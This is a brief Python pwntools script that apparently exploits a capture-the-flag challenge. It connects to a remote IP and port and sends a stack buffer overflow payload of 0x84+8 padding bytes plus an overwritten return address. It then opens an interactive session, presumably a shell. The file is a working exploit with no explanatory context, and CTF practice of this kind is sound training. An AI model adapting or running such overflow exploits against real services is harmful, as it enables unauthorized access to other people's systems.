from pwn import *

r = remote("104.154.106.182",2345)

payload = "A"*(0x84+8)

payload += p32(0x080484ad)

r.sendlineafter(": ", payload)

r.interactive()
